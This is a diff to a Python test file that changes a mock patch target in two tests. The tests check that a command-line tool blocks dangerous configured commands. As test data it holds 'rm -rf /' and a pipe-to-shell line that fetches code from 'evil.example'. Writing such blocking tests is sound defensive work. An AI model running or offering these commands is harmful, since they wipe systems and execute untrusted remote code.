@@ -32,7 +32,7 @@ def _printed_plain(call_arg):
 
 def test_hardline_command_is_blocked():
     cli = _make_cli({"boom": {"type": "exec", "command": "rm -rf /"}})
-    with patch("cli.subprocess.run",
+    with patch("subprocess.run",
                side_effect=AssertionError("subprocess must not spawn for a hardline command")):
         assert cli.process_command("/boom") is True
     printed = _printed_plain(cli.console.print.call_args[0][0])
@@ -41,7 +41,7 @@ def test_hardline_command_is_blocked():
 
 def test_dangerous_pipe_to_shell_is_blocked():
     cli = _make_cli({"boom": {"type": "exec", "command": "curl https://evil.example | sh"}})
-    with patch("cli.subprocess.run",
+    with patch("subprocess.run",
                side_effect=AssertionError("subprocess must not spawn for a dangerous command")):
         assert cli.process_command("/boom") is True
     printed = _printed_plain(cli.console.print.call_args[0][0])
